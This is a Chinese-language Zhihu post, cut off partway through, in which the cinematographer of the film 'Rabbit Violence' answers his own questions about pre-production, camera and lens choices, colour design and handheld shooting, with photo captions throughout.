[{"title":"你觉得电影《兔子暴力》拍得怎么样？","date":"2021-08-18 09:58:49","description":"\n<p>电影《兔子暴力》摄影指导汪士卿九问九答：</p>\n<p>2021年七夕来临之前，全国局部疫情反弹，部分省市电影院关门，影市惨淡。电影《兔子暴力》则提档到8月14日上映，这是一种直面困难的勇气，人生需要乘风破浪，才能抵达彼岸。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-8db387cb4f20ffcf160a9e2ec582a4d4_720w.jpg?rss\" data-rawwidth=\"1080\" data-rawheight=\"1532\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-8db387cb4f20ffcf160a9e2ec582a4d4\" data-watermark-src=\"v2-12a15feaed382bcca8aff0980477a8b1\" data-private-watermark-src=\"v2-d02f3727cb1c7263fdeeb306f4623b49\"></p>\n<p>缘起：我荣幸在2019年元旦那一天，（当时还在浙江台州外景拍摄）收到劳雷影业制片人杨菲菲发来的剧本，看完很喜欢，当天回复了我的读后感：</p>\n<p>“杨总，我刚刚仔细看完了剧本，觉得人物关系很细腻 很有生活质感的真实。边缘城市攀枝花和金沙江流域我去过，知道那里的人文地貌，工业空间很特别（历史的痕迹）城市给人有一种疏离感 ，同时山水天感觉很近。回忆和现实都可以拍摄的很诗意（幻觉 梦境 玄外之音）剧本很多琐碎生活的日常细节很耐看，母女、水青的同学关系具有张力。 我也喜欢舞蹈部分展示了丰富人物的心理外化，在制作上摄影灯光与演员、美术部门的配合十分重要，感觉导演风格还是作者化态度，关于影像如何风格化来帮助导演来叙事，需要与导演进一步沟通。”</p>\n<p>第二天劳雷方励总加我微信，他回顾了我参加2016年电影《百鸟朝凤》宣发mv拍摄的故事，他又把我推荐给监制李玉和导演申瑜。3月初我回到北京后的一天，在公司第一次见到导演，记得很清楚的是导演问我曲婷（万茜）开的小汽车，你觉得什么颜色合适？我没有思索说，黄色吧。（潜意识里是因为觉得曲婷是一个潜在危险的角色，另外对攀枝花的黄色的芒果印象很深）。导演和制片人哈哈大笑，原来在之前的筹备和美术设计中车就是黄色的，大家直觉一致是好的开始。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-57f099a2a286ecce31c52045a291193c_720w.jpg?rss\" data-rawwidth=\"4029\" data-rawheight=\"2791\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57f099a2a286ecce31c52045a291193c\" data-watermark-src=\"v2-a8467bac4cab25b064420440315136ce\" data-private-watermark-src=\"v2-c5ff0146b4ddc988d26a67971d0522df\"></p>\n<p>接下来的3月到7月大家就开始紧张的筹备和拍摄，因为劳雷公司的流程清晰，主创团结一致，电影在7月提前2天杀青。时隔一年，2020年8月在北京补拍了一场戏，宣告完成剪辑，随后调色混音，审查通过，10月入围了2020东京国际电影节。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-61a5042e83874ca6f7a4b819081a7e03_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"small\" data-caption=\"（大潘 方励 2020年8月北京补拍一场戏）。\" data-watermark=\"watermark\" data-original-src=\"v2-61a5042e83874ca6f7a4b819081a7e03\" data-watermark-src=\"v2-98260d542216aa278999ab44cead4de6\" data-private-watermark-src=\"v2-5f92468ef0085cc5a8cd4bcfd6c0c169\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-ebd61e77e02118a96bef8df1df1c88e2_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"small\" data-caption=\"（导演申瑜 耐安 周子越）\" data-watermark=\"watermark\" data-original-src=\"v2-ebd61e77e02118a96bef8df1df1c88e2\" data-watermark-src=\"v2-0caa80914bb8fe13eb14b32289ac26c9\" data-private-watermark-src=\"v2-5c06ca0c52f10358315fb057612e725d\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c6341f552023c96c327fab9daafd48d4_720w.jpg?rss\" data-rawwidth=\"4096\" data-rawheight=\"3072\" data-size=\"normal\" data-caption=\"（2020年8月底在画林公司看影片调色版后主创合影，摄影汪士卿 调色师朴相洙 统筹小凡 执行导演房震 导演申瑜 美术指导张杰涛 制片曲建伟）\" data-watermark=\"watermark\" data-original-src=\"v2-c6341f552023c96c327fab9daafd48d4\" data-watermark-src=\"v2-db02651f9bdcc522d16f62ad4992837d\" data-private-watermark-src=\"v2-851b3c5f837a683ce7157e68e01a7be7\"></p>\n<p>诗意是生活中影像真实的力量，哪怕总被忽视，即便是书写生命的悲剧、宿命、幻灭、甚至死亡，隧道的点点微光总是引人前行。</p>\n<p> 电影的语言并非文字，而是画面，包含着角色情感的潜台词以及它们如何被呈现。导演会启发大家发现那种隐喻，那种画面中潜在的情感，剩下的就交给摄影机吧。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-10fd073245d840565ddbef5c153bc22f_720w.jpg?rss\" data-rawwidth=\"4272\" data-rawheight=\"2848\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-10fd073245d840565ddbef5c153bc22f\" data-watermark-src=\"v2-13d072818caecfc56c819eacc7bfbecb\" data-private-watermark-src=\"v2-6ab11490249055984fed82c03295a2f3\"></p>\n<p>下面我采用自问自答的方式来小结电影的影像构思和拍摄过程：</p>\n<p>一问：电影开机之前，主创都做了那些准备工作，你如何与导演沟通案头？ </p>\n<p>答：这个电影在我参与之前2018年已经筹备过，所以有很好的基础。我是2019年3月正式参与筹备，拍电影有意思的是从文字到影像的呈现过程，先看剧本是靠想象，，可以高谈阔论，大家各抒己见。我最初写个一个摄影概念阐述，简单分析了摄影参与叙事的几大元素，当一个靶子让大家来讨论。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-57de0fa70a423d206b8d97baa363a4bf_720w.jpg?rss\" data-rawwidth=\"2340\" data-rawheight=\"1320\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-57de0fa70a423d206b8d97baa363a4bf\" data-watermark-src=\"v2-b2b065ffbe29646ed1acf0206861ef31\" data-private-watermark-src=\"v2-d24c782ab5030548cc6987d4dc64ba55\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-a02125beabe982944dc6142e2dffa0c3_720w.jpg?rss\" data-rawwidth=\"2212\" data-rawheight=\"1319\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-a02125beabe982944dc6142e2dffa0c3\" data-watermark-src=\"v2-471f674158ace27c9aa9fea065bee4f0\" data-private-watermark-src=\"v2-872d59046a58f1fc02f032193dc10363\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-be602a5f5f063bf460ab28e82811e270_720w.jpg?rss\" data-rawwidth=\"2711\" data-rawheight=\"1588\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-be602a5f5f063bf460ab28e82811e270\" data-watermark-src=\"v2-491cea6b73b7cf928a1b3934a4a06577\" data-private-watermark-src=\"v2-39bdb4f68b417ab31676ba620fa276f1\"></p>\n<p> 4月初主创集体去攀枝花市看景，带了分镜师边看边画。5月初我再次赴攀枝花拍摄测试片，回来监制和主创都在画林公司看了大银幕效果。5月中，针对看景和测试，我们详细讨论了每一场戏的分镜方案，因为导演原来是美术出身，所以她能很好分解空间，甚至自己画出分镜讲解，共同设计平面机位图。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-8a53cea2daf174d982be0d9e99ed2b5f_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"small\" data-caption=\"（导演画的）\" data-watermark=\"watermark\" data-original-src=\"v2-8a53cea2daf174d982be0d9e99ed2b5f\" data-watermark-src=\"v2-a0ba41b16c1b4f62426b19346792d149\" data-private-watermark-src=\"v2-68391309eab8c3f9132111802aaea5ed\"></p>\n<p><img src=\"https://pic4.zhimg.com/v2-0bde332733975da8e22438ba6aecaf19_720w.jpg?rss\" data-rawwidth=\"3914\" data-rawheight=\"2560\" data-size=\"small\" data-caption=\"（分镜师画的）\" data-watermark=\"watermark\" data-original-src=\"v2-0bde332733975da8e22438ba6aecaf19\" data-watermark-src=\"v2-53122a03f5326cf4b7d1262348f4642a\" data-private-watermark-src=\"v2-d15845b9673169787b80b1d637850157\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-14ecccc0a432c5ac55a61761168bfbe2_720w.jpg?rss\" data-rawwidth=\"3772\" data-rawheight=\"2757\" data-size=\"small\" data-caption=\"（我画的）\" data-watermark=\"watermark\" data-original-src=\"v2-14ecccc0a432c5ac55a61761168bfbe2\" data-watermark-src=\"v2-9c85f2f070a139c060e1a4b140758c65\" data-private-watermark-src=\"v2-7c73fcb61b078b07e850fe490e12cef0\"></p>\n<p>万茜和其他3位女孩都有舞蹈的戏，北京排练的时候我也参加，并且使用相机模拟拍摄，和导演确定一个原则，摄影机也参与舞蹈，也是一个演员，舞蹈层面摄影机参与更加自由浪漫，像《黑天鹅》《爱乐之城》一样。</p>\n<p>我有长时间纪录电影的拍摄经验，所以对手持拍摄并不陌生。针对剧本里万茜和李庚希的前史和女儿梦境心理刻画部分，我提出戏剧光效表现手法，导演看了我多年前在先力摄影棚拍摄的一个广告，灯光在大炮移动暗示时间的变化，很契合，她同意了我的想法。</p>\n<p>所以画面落实在光影层面就是真实与表现的结合。全片的诗意一方面来自真实感，包括人物情绪关系，生活场景等，另一方面是剧场和梦境过去时空的表现性处理方式，那是李庚希心理幻觉的真实，表达她对母爱的一种渴望。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-45f49032982be1c58ae29750c972edf6_720w.jpg?rss\" data-rawwidth=\"2282\" data-rawheight=\"1371\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45f49032982be1c58ae29750c972edf6\" data-watermark-src=\"v2-7a86ad4c75412a177fdce7db7c6bfd49\" data-private-watermark-src=\"v2-0fbdd3b22efb76fede2ffad3319040ab\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-269e251fbcecab9dbeb3ed3d3b2ec2bf_720w.jpg?rss\" data-rawwidth=\"4112\" data-rawheight=\"2495\" data-size=\"normal\" data-caption=\"（曲婷带水青去自己年轻时曾演出过的废弃剧场   遗憾剪辑时戏删了）\" data-watermark=\"watermark\" data-original-src=\"v2-269e251fbcecab9dbeb3ed3d3b2ec2bf\" data-watermark-src=\"v2-731088950c863751008c16d10c18c0ac\" data-private-watermark-src=\"v2-0dbc368521e598578e56c946dda0d9d0\"></p>\n<p>诗意也是最生命高光的一种主观描述 有时越主观越真实。波兰导演基耶斯洛夫斯基从纪录片转故事片创作，反而选择个克制主观多义神秘的《维洛妮卡双重生活》和《红 百 蓝》三部曲。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-9db6290785e3ca7a31797103e4bf4ac0_720w.jpg?rss\" data-rawwidth=\"562\" data-rawheight=\"345\" data-size=\"normal\" data-caption=\"（维罗妮卡的双重生活）\" data-watermark=\"watermark\" data-original-src=\"v2-9db6290785e3ca7a31797103e4bf4ac0\" data-watermark-src=\"v2-d9229e727d33df36839a930994547570\" data-private-watermark-src=\"v2-210c17b88f79b2a80f2154b6533ad622\"></p>\n<p>开机前和拍摄中间隙，我们进行了多次技术复景，对每一个场景各个环节配合做到心中有数，促使这次拍摄我们提前2天杀青。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-cfc6cc2be95a8fcd964c4f0797803e67_720w.jpg?rss\" data-rawwidth=\"2208\" data-rawheight=\"1242\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-cfc6cc2be95a8fcd964c4f0797803e67\" data-watermark-src=\"v2-df64d50c3f7b47f7ccd1fe46b6fa2c9a\" data-private-watermark-src=\"v2-551bbc7a8b3af65f2b97b741a694afa2\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-16f7bba12ddd3fb077c8b6189f260302_720w.jpg?rss\" data-rawwidth=\"1440\" data-rawheight=\"994\" data-size=\"normal\" data-caption=\"（第一副导演小凡 柴烨 周子越 执行导演房震 导演申瑜）\" data-watermark=\"watermark\" data-original-src=\"v2-16f7bba12ddd3fb077c8b6189f260302\" data-watermark-src=\"v2-ef1afe995dd7378251450646c6c10702\" data-private-watermark-src=\"v2-d112eee34ea4673cabdbbe77d3fddd5a\"></p>\n<p><br></p>\n<p>二问：你拍电影都会拍摄测试片吗？ </p>\n<p>答：电影项目测试拍摄是必不可少的，测试结果要上大银幕技术检查和寻找艺术感觉。这个电影也不例外，在我即将要提出拍摄测试片的时候，制片人杨菲菲已经提前安排了，这一点也是不谋而合。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-9220f6562a06f4d9567230dc0dfd0e12_720w.jpg?rss\" data-rawwidth=\"2030\" data-rawheight=\"1831\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-9220f6562a06f4d9567230dc0dfd0e12\" data-watermark-src=\"v2-43a905c6c9214b38663a76fd83f21441\" data-private-watermark-src=\"v2-98c3ea895087ac62ce36f8992dd7e62c\"></p>\n<p> 测试基本把主要场景的空间结构和晨昏密度，还请道具兄弟当替身演员走了几场戏的调度。测试我带了三个摄影机：alexa mini，国产kinifinity mavo 和松下eva。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-4e86c9948c2ea93d3882afe21062fe32_720w.jpg?rss\" data-rawwidth=\"3360\" data-rawheight=\"2100\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4e86c9948c2ea93d3882afe21062fe32\" data-watermark-src=\"v2-f2f2305611bc8bbe52f6782b248d5173\" data-private-watermark-src=\"v2-0bb3d97635ec68f3b43b72f185ddf593\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-3cb5e6c6fbf8fa3dd1e4f9e7b9bcb954_720w.jpg?rss\" data-rawwidth=\"3360\" data-rawheight=\"2100\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-3cb5e6c6fbf8fa3dd1e4f9e7b9bcb954\" data-watermark-src=\"v2-452b53d1a9c8358d4482b883917ddee3\" data-private-watermark-src=\"v2-d7c1ceb3a30797697c645b3b31d5b877\"></p>\n<p>后两个机器主要考虑拟采用高感光度8000 夜景拍摄，另外一个重要测试是结尾江边驴友玩激光笔划过镜头，就是要对着感光元件拍摄，存在烧毁的危险，一旦损坏cmos，要十万赔偿。这个激光笔的干扰好像有人窥探了母女的秘密，让后面的故事急转之下…所以是特别重要，这个光有侵略性和危险性，也是一种辅助气氛。我是硬着头皮用三个机器都试拍了一遍，最后正式拍摄选择alexa，运气特别好的是，实拍中我们也拍摄到想要的激光笔画面，最后都没有损坏cmos。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-45625d80c06c626a695f34f64008f561_720w.jpg?rss\" data-rawwidth=\"1885\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-45625d80c06c626a695f34f64008f561\" data-watermark-src=\"v2-f071ff514ba3cd406d7d041d4270825b\" data-private-watermark-src=\"v2-83c2970a825de4f2eebdca8fdb90cb31\"></p>\n<p>测试另外一个重要项目是曲婷的小车，这个车是一个女主角性格的外化，流动的符号，制片在车型和色彩之间平衡费用，最后在当地买了一辆白色的别克小轿车，贴上黄色外膜，我监督了这个过程，不仅车的外观重要（色块），好几场车戏摄影机和演员都在车内拍摄的，车门玻璃不能贴膜（大潘在车内的戏删了）。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d42796a84f7078f4bbbde85b300de660_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"small\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-d42796a84f7078f4bbbde85b300de660\" data-watermark-src=\"v2-dd96c04058cd25d91c98097239243df7\" data-private-watermark-src=\"v2-23cd7ef08fc01a9cb062488c57419897\"></p>\n<p><br></p>\n<p> 三问：这个电影的场景和人物色彩看上去很特别，你是如何与美术部门配合实现的？ </p>\n<p>答：攀枝花是全国唯一一个以花名命名城市，原名渡口市，是建国之后沿着金沙江畔才建立的一个钢铁工业城市，有过几十年计划经济的辉煌。市场改制后，工业衰败，但是气候很好，地貌靠近云南，光照充足，城市绿色植被很多，适合康养。这个外景是监制方励推荐的，导演自2016年来这儿多次地毯式勘查，她先给我发了之前的场景报告，我就觉得这个外景参差不齐的空间关系暗合和电影人物关系，美术指导张杰涛对场景设计也有大胆的奉献。</p>\n<p>导演是学美术的背景，她开始就给我推荐了法国画家卢梭的几幅画作当视觉参考。卢梭的画的主题包罗万象，除了巴黎市郊，还有手法率真直接的人像，瑰丽的寓言性作品，花卉、尤其是一批富异国情调的大幅幻想式作品，这些作品是他常逛巴黎的公园、植物园、动物园所激发出来的。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-058015804ae257453e45677a953bf131_720w.jpg?rss\" data-rawwidth=\"500\" data-rawheight=\"372\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-058015804ae257453e45677a953bf131\" data-watermark-src=\"v2-1a2d7dc810d10a51d798a89daa4af071\" data-private-watermark-src=\"v2-caf87e2a5be2dd3c6c33328c9e0842d3\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-a9b6d658134273768c340189c89c9098_720w.jpg?rss\" data-rawwidth=\"776\" data-rawheight=\"300\" data-size=\"normal\" data-caption=\"（法国画家卢梭的画）\" data-watermark=\"watermark\" data-original-src=\"v2-a9b6d658134273768c340189c89c9098\" data-watermark-src=\"v2-afd3378709fd5711f9f0dbf1a6a0a9d5\" data-private-watermark-src=\"v2-d3e978d4be13562990d2fdda530f71c1\"></p>\n<p>曲婷的角色是闯入者带有危险感觉，她的汽车和服装基调是黄色，万茜演绎的生动而无常。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-51b188b082b3c602b27cfb7223888b50_720w.jpg?rss\" data-rawwidth=\"683\" data-rawheight=\"429\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-51b188b082b3c602b27cfb7223888b50\" data-watermark-src=\"v2-5c110f5faba62d33e88e90279a5fed44\" data-private-watermark-src=\"v2-43d81f803fb3c5c93e1e7509a12f5a38\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-4f6d52e7945cdeb4eb4bdfed9aeeb2f3_720w.jpg?rss\" data-rawwidth=\"690\" data-rawheight=\"388\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-4f6d52e7945cdeb4eb4bdfed9aeeb2f3\" data-watermark-src=\"v2-cce1a17afecbce4775b307ad183791ff\" data-private-watermark-src=\"v2-31af5ad116d54e33ef00d8c32c2713e7\"></p>\n<p>女儿水青是学生在青春叛逆期，她和女同学的校服定位为墨绿色，她身上有一种自发的原始的力量，愿意为妈妈做任何事，她同时渴望被母爱。</p>\n<p>曲婷和水青第一在早餐滩见面，和她请3个女孩子 吃饭那一场360度转圈拍摄的戏，美术在周围都装饰了绿色的植物和鲜花，因为那个露天广场本身是个花园。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-40fcbc88f1f3a30ca1bd6e5844d825ee_720w.jpg?rss\" data-rawwidth=\"3320\" data-rawheight=\"1777\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-40fcbc88f1f3a30ca1bd6e5844d825ee\" data-watermark-src=\"v2-568aeb198235e565866c2ef2d1835b01\" data-private-watermark-src=\"v2-037a83f919b6d49824d3e159886d24c5\"></p>\n<p>所以在母女色彩总谱上黄绿色，是一个危险又明亮的搭配，在服装道具也做了完善，曲婷给水青理发那一场，背景远处就有一个黄色的塑料盆。在教室里也有一些细节的黄色，白浩文黄色水杯，水青黄色刻刀，同学黄色练习本等。</p>\n<p>我在灯光选择上夜景采用了黄色的滤纸，或者使用钨丝灯泡局部加强黄色。在美术设计黄绿调子的的基础上，摄影光色实现主要前期加了1/4柔光镜，平衡室外的强光，加强一种怀旧情绪。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-214a3de5985a080cd790df587b009e80_720w.jpg?rss\" data-rawwidth=\"864\" data-rawheight=\"577\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-214a3de5985a080cd790df587b009e80\" data-watermark-src=\"v2-72fe458350387a2fea5d6979d62052b7\" data-private-watermark-src=\"v2-0b5a052e7e5b2ee8f601522f4f489d13\"></p>\n<p>四问：你这次采用的摄影机和镜头是怎么考虑的？如何和演员配合？</p>\n<p>答：我做完测试片，对比三台摄影机之后，还是选择了稳定的alexa mini 两台。 我们90%的戏单机拍摄，便于演员调度和实景打光更有益抓到表演，开场万茜和大潘在桥头汇合、中间四个女孩聚餐360度旋转、万茜雨夜开车等几场戏是双机拍摄。</p>\n<p>镜头上，选择了复古了cooke s5和cooke panchro 混搭，焦距从18mm到65mm拍人物，还有两只安琴小变焦15-40和 28-76拍车戏。长焦24-290记得就用了一场戏，水青给马悦悦递下了安眠药的饮料，然后犹豫不决，最后扶她上车，我在马路对面架了长焦压缩空间拍到车流划过。器材上没有追新追贵的，比较常规，日景f4-f5.6定光，夜景f2-f2.8，只有结尾金沙江边母女误杀女儿同学那一场极致夜外景，f1.4拍摄。</p>\n<p>我最爱的纪实摄影大师不是使用50mm镜头布列松，而是捷克的摄影家寇德卡，他的leica相机最爱的焦距是25mm镜头，我有一本他的小画册很贵的， 比烟盒大一点，随时装在包里飞机地铁里拿出来看方便。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-46775435c31b475b3318d4775b0251b3_720w.jpg?rss\" data-rawwidth=\"895\" data-rawheight=\"468\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-46775435c31b475b3318d4775b0251b3\" data-watermark-src=\"v2-998f81e06a0ca9f0aa031ecf77f2601a\" data-private-watermark-src=\"v2-a104f7032ba82fcc69d88443afadea43\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-9eb502ac4baaa3ff7af51c4c8d053199_720w.jpg?rss\" data-rawwidth=\"640\" data-rawheight=\"441\" data-size=\"normal\" data-caption=\"（寇德卡作品 有神秘感 他拒绝解释画面）\" data-watermark=\"watermark\" data-original-src=\"v2-9eb502ac4baaa3ff7af51c4c8d053199\" data-watermark-src=\"v2-118e120d19b5784ccced5dd80c279bf7\" data-private-watermark-src=\"v2-36d6964da604cf0f02f03c198f6c9a22\"></p>\n<p> 这个电影我最常用的是21mm 和27mm 以及32mm三只镜头，这样的选择是贴近演员在3feet和6feet 之间自由活动，同时带出环境，环境也是另外一个主人公。环境背景信息，演员才是最重要的，短焦镜头和演员的互动中凸显亲密感，也有景深。实拍我们以长镜头方式为主，经常一条12分钟不关机，导演不喊停也喜欢抓表演的真实与偶然的火花，发生在情境的演员是最美的。我必须考虑技术物理性的呈现的可能，总体还是放得开，在局部表现性镜头上也要收的住。</p>\n<p>所有的戏设计都是和演员一起完成的，我们没有限制演员的走位，不能说多走一步就没有焦点，掌机时必须用身体随时调整位置关系，做到极致还要保持构图和光影等，偶尔把演员也放在阴影里面。万茜从戛纳《南方车站聚会》首映回来，就全情投入到《兔子暴力》的拍摄。黄觉打万茜耳光，后拉入小屋强暴（剪辑版删了）那一个段落拍摄一条就15分钟，然和看回放讨论，一个上午拍摄8条，很大的动作体力活，两位老师都非常配合。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-fc60991d7ec43ccb746c643f796c3130_720w.jpg?rss\" data-rawwidth=\"3263\" data-rawheight=\"1432\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-fc60991d7ec43ccb746c643f796c3130\" data-watermark-src=\"v2-a663b12f82cfb7777bd7172332dd5ea5\" data-private-watermark-src=\"v2-7f89fef1b3afa14535cb665cec38b3d5\"></p>\n<p>李庚希、金烨、周子越、俞更寅四位年轻演员很早4月份就在北京，执行导演房震的带领下围读剧本，周边的学生群众演员也在攀枝花当地培训，实拍中出演都非常出色。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-5a26e49a59426862b91a33fbc1ef03ff_720w.jpg?rss\" data-rawwidth=\"920\" data-rawheight=\"518\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5a26e49a59426862b91a33fbc1ef03ff\" data-watermark-src=\"v2-8ead6d338fe7c78e9a2b01af47e9a252\" data-private-watermark-src=\"v2-033051979f5dd331b5b3f3f63d74dd3f\"></p>\n<p>饰演金熙的演员柴烨当时是大二的学生，演一位自负控制欲强的大姐大。几位朋友问我金熙在卫生间里拿电烙铁放手臂上干嘛？其实是有自残倾向的纹身。电影里一闪而过，很多人没有看清楚。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-0fd2899e57c5711fc6de70f449d09a22_720w.jpg?rss\" data-rawwidth=\"2035\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-0fd2899e57c5711fc6de70f449d09a22\" data-watermark-src=\"v2-cf3780cfde9c428bc32ecf4ea19939ef\" data-private-watermark-src=\"v2-fd2ecd69c6b263d8a654ac82e8b7dcb9\"></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f28a2ab2a062a875245e469e5a1126ca_720w.jpg?rss\" data-rawwidth=\"1067\" data-rawheight=\"1422\" data-size=\"normal\" data-caption=\"（金熙手臂上是等高线纹身）\" data-watermark=\"watermark\" data-original-src=\"v2-f28a2ab2a062a875245e469e5a1126ca\" data-watermark-src=\"v2-53d27e84daa5ba82e1474475bc36a0b4\" data-private-watermark-src=\"v2-4a7907f17aaa4cd4ae92428428e27451\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1410a227c2c0010ba1370752b5df841a_720w.jpg?rss\" data-rawwidth=\"900\" data-rawheight=\"1399\" data-size=\"small\" data-caption=\"（金熙在教室外候场 ）\" data-watermark=\"watermark\" data-original-src=\"v2-1410a227c2c0010ba1370752b5df841a\" data-watermark-src=\"v2-bae514e87890e509788a8286b6f75c3c\" data-private-watermark-src=\"v2-d2d78398a92d8f7a2873da91e95bc044\"></p>\n<p>必须要赞大潘老师的敬业，他饰演的中年老马是马悦悦的爸爸，一个外出打工回来的离异父亲，爱的极端自我真实。他为高考的女儿补充营养，专门给女儿做鱼，老马在桥上等女儿一夜未归，黎明时刻终于见到马悦悦后抽打自己耳光那一场戏是大潘自己改的，和剧本不一样，为了这个戏大潘和导演在现场讨论了很久，最后天都大亮了，导演问我能压着拍吗？我说不行，黎明密度气氛不对了。第二天一大早我们再去炳草岗大桥拍的这个镜头，相信给大家留下深刻印象。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a31dfcbb84c2a969a24efe2a2f7e76b7_720w.jpg?rss\" data-rawwidth=\"2301\" data-rawheight=\"2824\" data-size=\"small\" data-caption=\"（我和大潘）\" data-watermark=\"watermark\" data-original-src=\"v2-a31dfcbb84c2a969a24efe2a2f7e76b7\" data-watermark-src=\"v2-9f05367d55f45aa772df2d7fde630310\" data-private-watermark-src=\"v2-8484592bb0d2409fa70662b04d6794a5\"></p>\n<p><br></p>\n<p>五问：这次摄影机镜头的运动都是手持吗？ </p>\n<p>答：开机之前和和导演关于运动设计，是一半手持。在测试片时，导演给我发信说要实拍中加大了手持的量，所以实拍中超过90%。   </p>\n<p><img src=\"https://pic2.zhimg.com/v2-74d884d69e7f838f307ea3cfad3597fa_720w.jpg?rss\" data-rawwidth=\"2126\" data-rawheight=\"1080\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-74d884d69e7f838f307ea3cfad3597fa\" data-watermark-src=\"v2-2fb6b0b9b1532245e4dfe99ab26e3491\" data-private-watermark-src=\"v2-f1b9e6bf87082de60bb378c220732149\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-71fe2c52f96e264bc442d288c753eb7d_720w.jpg?rss\" data-rawwidth=\"3366\" data-rawheight=\"2178\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-71fe2c52f96e264bc442d288c753eb7d\" data-watermark-src=\"v2-29e8c0fe8cf2c136b9888421650d082e\" data-private-watermark-src=\"v2-f9c09969d69cb698d6c1797804a27b34\"></p>\n<p>但是手持摄影也有短板，依据空间环境和调度关系，我也用easyrig、用轨道横移动、轨道后拉、360度环形拍摄，机器不上云台，模拟手持感，没用采用如影和斯坦尼康那样平滑的运动。曲婷给水青理发，教室里同学老师听水青广播站的念信：没有胆怯懦弱，做你朋友很幸福的反应、等都是采用这种方法。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-5fd030525973bfaec894b329974aa73f_720w.jpg?rss\" data-rawwidth=\"863\" data-rawheight=\"575\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-5fd030525973bfaec894b329974aa73f\" data-watermark-src=\"v2-48be8e4d6fcb91f7703ae0479b761f7c\" data-private-watermark-src=\"v2-2f311b2c47d8a7d7aeaed7c9fa1bed63\"></p>\n<p>大炮的使用 主要是来移动灯光（剧场水青回忆小时候 水青的梦境等）和拍摄车戏，我们保持基本是人眼高度视角（除了几个航拍空镜外）。</p>\n<p><img src=\"https://pic2.zhimg.com/v2-64cfde99e128d295968bcf8738915c15_720w.jpg?rss\" data-rawwidth=\"4032\" data-rawheight=\"3024\" data-size=\"normal\" data-caption=\"\" data-watermark=\"watermark\" data-original-src=\"v2-64cfde99e128d295968bcf8738915c15\" data-watermark-src=\"v2-e6ab166c41b124625fd4f6a037962e2d\" data-private-watermark-src=\"v2-ee1ad2e77beb94b5ceae4b46bf1d62ac\"></p>\n<p><br></p>\n<p>六问：隧道的意向是剧本设定好的吗？</p>\n<p>答：这是导演的秘密，也是曲婷和水青的秘密暗号，隧道是剧本强烈设定的意向， 